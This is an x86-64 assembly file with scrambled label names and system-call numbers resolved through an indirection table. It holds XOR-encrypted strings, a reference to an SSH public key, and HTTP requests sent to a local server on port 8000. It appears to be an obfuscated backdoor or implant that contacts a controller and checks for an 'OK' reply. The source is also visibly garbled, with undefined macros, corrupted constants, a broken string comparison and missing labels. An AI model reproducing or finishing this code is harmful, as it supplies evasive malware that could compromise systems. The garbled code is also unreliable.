; manage AlaG1EQD7S
T1KiyCzKu:
push rbp
mov rbp, rsp 
call CWkr1lobjc
cmp rax, 0 
jl MPGfK

VjlRq:
;rdi == sockfd
mov rdi, rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 111]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 239]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 367]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 495]
or  rax, r14 
pop r14
pop r15
lea rsi, [rel LrllbEoD7]
mov rdx, h4VAb5yxc
xor r10, r10
xor r9, r9
syscall
test rax, rax
js MPGfK

WZHyX:
push rdi
mov rax, 35 
lea rdi, [rel kPnoFm]
xor rsi, rsi
syscall
pop rdi

tQaxv:
;* rdi == sockfd
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 112]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 240]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 368]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 496]
or  rax, r14 
pop r14
pop r15
sub rsp, 200 
mov rsi, rsp
mov rdx, 200 
xor r10, r10
syscall
test rax, rax
js MPGfK

hKJnm:
;* rdi == sockfd
mov rsi, rsp
call Q5peR59
add rsp, rax
sub rsp, 2 

cmp WORD [rsp], 0x4b4f 
jne wuS0RpfyC

MPGfK:
call bZFukrNs0b
mov rax, 0 
jmp BzpaAlBB1g

wuS0RpfyC:
call bZFukrNs0b
mov rax, -1
jmp BzpaAlBB1g

; strcpy(dst:rsi src: rdi)
GjTE69MKS:
xor rcx, rcx
Jpv03:
cmp byte [rdi + rcx], 0 
je xBM36
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp Jpv03
xBM36:
ret

klfIuF:
call GjTE69MKS
mov byte [rsi + rcx], 0 
ret

; strncpy(dst:rsi, src: rdi, count: rcx)
ZnrcR:
sub rcx, 1 
z68Cfnne:
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
loop z68Cfnne
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
ret

; strlen(str:rsi)
Q5peR59:
xor rcx, rcx

Pm7Gi:
cmp byte [rsi + rcx], 0 
je MOMvdZ
inc rcx
jmp Pm7Gi

MOMvdZ:
mov rax, rcx
ret

; strcmp(rdi, rsi)
vOScuUM:
xor rcx, rcx
xor rax, rax
YJ83SWe:
mov al, byte [rdi + rcx]
mov bl, byte [rsi + rcx]
cmp al, bl
jl N8RCeV2D
je N8RCeV2D
jg N8RCeV2D

cmp al, 0 
je N8RCeV2D

add rcx, 1 
jmp YJ83SWe

N8RCeV2D:
movzx rax, al
movzx r8, bl
sub rax, r8
ret

; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
tUhyVQ:
mov r9, 10 
call VXcl2z
ret

VXcl2z:
cmp rax, 9 
jg plZtEqp
mov [rsi], ax
add byte [rsi], 48 
inc rsi
ret

plZtEqp:
push rax
xor rdx, rdx
div r9
call VXcl2z 
pop rax
push rax
xor rdx, rdx
div r9
mov rax, rdx
call VXcl2z 
pop rax
ret

VvkEFUsR:
lea rdi, INF(AlaG1EQD7S.xe3pTfFv)
lea rsi, INF(AlaG1EQD7S.FYqWE)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 108]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 364]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 492]
or  rax, r14 
pop r14
pop r15
syscall
jmp bMQHHc

bMQHHc:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 106]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 234]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 362]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 490]
or  rax, r14 
pop r14
pop r15
mov rdi, INF(AlaG1EQD7S.z6iUW6Bl1w)
syscall
mov qword INF(AlaG1EQD7S.z6iUW6Bl1w), -1
jmp BzpaAlBB1g

rgL6wuUH:
mov rax, 60 
xor rdi, rdi
syscall

gLbIdUM7v db 0x6A, 0x2C, 0x02, 0x16, 0x51, 0x59, 0x30, 0x5B, 0x34, 0x2C 
bDBowiO    equ $ - gLbIdUM7v
ZSxt6M db 0x6A, 0x2C, 0x02, 0x16, 0x51, 0x59, 0x30, 0x5B, 0x34, 0x1E, 0x37 
TTB3ueV11U    equ $ - ZSxt6M
jLm5K db 10, 0 
uqGQoN db 0x6A, 0x58 
P3aNh2 db 0x6A, 0x2A, 0x00, 0x09, 0x0A, 0x02, 0x7B, 0x5B, 0x33, 0x44, 0x18, 0x42, 0x30, 0x2C, 0x07, 0x09, 0x0C, 0x44, 0x2F, 0x4D, 0x24, 0x73, 0x5C, 0x46, 0x3C, 0x2B, 0x6F 
G41rJ db 0x36, 0x2B, 0x07, 0x4B, 0x1B, 0x49, 0x67, 0x1D, 0x75, 0x1D, 0x0E, 0x03, 0x04, 0x19, 0x2E, 0x27, 0x3D, 0x1E, 0x1B, 0x52, 0x21, 0x6F, 0x06, 0x4F, 0x1F, 0x1C, 0x26, 0x57, 0x30, 0x79, 0x10, 0x1D, 0x01, 0x6D, 0x76, 0x62, 0x0C, 0x13, 0x0C, 0x15, 0x3A, 0x4F, 0x3C, 0x52, 0x21, 0x1F, 0x63, 0x50, 0x73, 0x1A, 0x56, 0x32, 0x0E, 0x4E, 0x30, 0x40, 0x38, 0x46, 0x6E, 0x1B, 0x35, 0x3B, 0x3F, 0x0F, 0x14, 0x43, 0x11, 0x50, 0x02, 0x5C, 0x42, 0x4A, 0x00, 0x33, 0x00, 0x12, 0x2C, 0x6E, 0x3B, 0x18, 0x60, 0x4B, 0x58, 0x57, 0x31, 0x31, 0x0A, 0x26, 0x1A, 0x48, 0x37, 0x41, 0x21, 0x42, 0x37 
vNOmOUYXy   equ $-sshPub
cayjQ9:
XidV3 2 
XidV3 0x401F 
A7i3S 0x100007Fexit 
MzEScf 0 

lXTJWE db 0x15, 0x17, 0x3C, 0x32, 0x5E, 0x02, 0x30, 0x50, 0x34, 0x5E, 0x56, 0x40, 0x31, 0x78, 0x27, 0x32, 0x2A, 0x7D, 0x7A, 0x19, 0x6E, 0x1D, 0x37, 13, 10 
"Host: 127.0.0.1:8000", 13, 10, \ 
"Content-Type: text/plain", 13, 10, \ 
"Content-Length: ", 0 
p7JoOByuKM equ $-headerStart
hy2XABbSiM db 13, 10, 13, 10, 0 
ewFgX4 equ $-headerEnd
LrllbEoD7 db 0x02, 0x1D, 0x3B, 0x46, 0x51, 0x44, 0x3B, 0x4E, 0x25, 0x4F, 0x43, 0x4A, 0x2A, 0x36, 0x4F, 0x2E, 0x2A, 0x79, 0x05, 0x07, 0x71, 0x02, 0x06, 0x23, 13, 10 
"Host: 127.0.0.1:8000", 13, 10, \ 
13, 10, 0 
h4VAb5yxc equ $ - LrllbEoD7
kPnoFm:
MzEScf 0 
MzEScf 10000000 
qpOZp db 0x35, 0x3D, 0x1C, 0x12, 0x17, 0x41, 0x30, 0x46, 0x23, 0x49, 0x17, 0x55, 0x20, 0x2A, 0x1C, 0x0F, 0x11, 0x43, 0x75, 0x19, 0x6E, 0x1C, 0x17, 0x0B, 0x26, 0x71, 0x00, 0x02, 0x1B, 0x49, 0x75, 0x4A, 0x39, 0x0C, 0x56, 0x4D, 0x33, 0x31, 0x01, 0x05, 0x1B, 0x43, 0x78, 0x4D, 0x25, 0x48, 0x4E, 0x23 
jkDDgF3 equ $ - qpOZp
YEgcOF: 